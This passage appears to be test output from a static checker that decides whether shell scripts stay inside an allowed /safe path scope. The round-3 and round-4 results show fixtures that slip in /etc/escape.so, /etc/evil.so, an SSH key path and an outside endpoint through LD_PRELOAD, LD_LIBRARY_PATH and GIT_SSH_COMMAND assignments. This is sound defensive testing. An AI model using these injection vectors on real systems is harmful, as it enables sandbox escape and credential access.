UNRESOLVED line=1442 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=sendq="$3"
UNRESOLVED line=1442 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $4 expression=localaddr="$4"
UNRESOLVED line=1442 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $5 expression=peer="$5"
UNRESOLVED line=1453 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_EP_ADDR expression=addr="$WPI_EP_ADDR"
UNRESOLVED line=1453 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_EP_PORT expression=port="$WPI_EP_PORT"
UNRESOLVED line=1455 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=total=$(( total + 1 ))
UNRESOLVED line=1457 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=port_rows=$(( port_rows + 1 ))
UNRESOLVED line=1462 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_EP_ADDR expression=wildcard_addr="$addr"
UNRESOLVED line=1466 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=count=$(( count + 1 ))
UNRESOLVED line=1485 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=field="$1"
UNRESOLVED line=1487 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${entry#*:} expression=WPI_LINE="${entry#*:}"
UNRESOLVED line=1493 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=body="$EV_DIR/ro.status.body"
UNRESOLVED line=1514 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=WPI_BODY_SHA="$WPI_LINE"
UNRESOLVED line=1553 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=record="$WPI_LINE"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
```

## Complete pre-repair transcript for family P10 (round-3 bytes, `0724967E…25F7`)

```text
=== c2_list_prefix ===
PATHSCOPE shell=c2_list_prefix.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_list_env ===
PATHSCOPE shell=c2_list_env.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:env assignment
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_list_export ===
PATHSCOPE shell=c2_list_export.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_list_bare_first ===
PATHSCOPE shell=c2_list_bare_first.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_list_space ===
PATHSCOPE shell=c2_list_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_relative ===
PATHSCOPE shell=c2_relative.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_empty_member ===
PATHSCOPE shell=c2_empty_member.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_quoted_space ===
PATHSCOPE shell=c2_quoted_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe dir/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_escaped_space ===
PATHSCOPE shell=c2_escaped_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/a b:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_command_text ===
PATHSCOPE shell=c2_command_text.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_uri_forbid ===
PATHSCOPE shell=c2_uri_forbid.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_uri_allow ===
PATHSCOPE shell=c2_uri_allow.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_env_quoted ===
PATHSCOPE shell=c2_env_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_bare_soname ===
PATHSCOPE shell=c2_bare_soname.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_allow_list ===
PATHSCOPE shell=c2_allow_list.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib:/safe/lib64 verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_benign_scalars ===
PATHSCOPE shell=c2_benign_scalars.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_benign_words ===
PATHSCOPE shell=c2_benign_words.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_words_with_path ===
PATHSCOPE shell=c2_words_with_path.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
```

## Complete pre-repair transcript for families P10 and P11 (round-4 bytes, `553A97E9…E2EB`)

```text
=== c2_list_prefix ===
PATHSCOPE shell=c2_list_prefix.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_env ===
PATHSCOPE shell=c2_list_env.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:env assignment
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:env assignment
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_export ===
PATHSCOPE shell=c2_list_export.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:export assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_bare_first ===
PATHSCOPE shell=c2_list_bare_first.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_space ===
PATHSCOPE shell=c2_list_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ and this tool does not model which consumer splits it expression=LD_PRELOAD="bare.so /etc/escape.so"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_relative ===
PATHSCOPE shell=c2_relative.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/elsewhere/relative/path.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_empty_member ===
PATHSCOPE shell=c2_empty_member.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment path list contains an empty member, which names the consumer's current directory rather than a static pathname expression=LD_LIBRARY_PATH=:/etc/escape
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_quoted_space ===
PATHSCOPE shell=c2_quoted_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe dir/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_escaped_space ===
PATHSCOPE shell=c2_escaped_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/a b verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/a b:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_command_text ===
PATHSCOPE shell=c2_command_text.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/key verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ and this tool does not model which consumer splits it expression=GIT_SSH_COMMAND="ssh -i /etc/key"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_uri_forbid ===
PATHSCOPE shell=c2_uri_forbid.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=198.51.100.10:9999 verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_uri_allow ===
PATHSCOPE shell=c2_uri_allow.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_env_quoted ===
PATHSCOPE shell=c2_env_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/evil.so verdict=FORBID rule=- sources=NONE uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_bare_soname ===
PATHSCOPE shell=c2_bare_soname.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_allow_list ===
PATHSCOPE shell=c2_allow_list.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib64 verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib:/safe/lib64 verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_benign_scalars ===
PATHSCOPE shell=c2_benign_scalars.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_benign_words ===
PATHSCOPE shell=c2_benign_words.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_words_with_path ===
PATHSCOPE shell=c2_words_with_path.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/secret verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ and this tool does not model which consumer splits it expression=MSG="denied /etc/secret"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c3_ws_relative ===
PATHSCOPE shell=c3_ws_relative.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib relative/escape.so verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_ws_later_word ===
PATHSCOPE shell=c3_ws_later_word.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/a plain verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_uri_list ===
PATHSCOPE shell=c3_uri_list.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_uri_pair ===
PATHSCOPE shell=c3_uri_pair.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_colon_whole ===
PATHSCOPE shell=c3_colon_whole.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
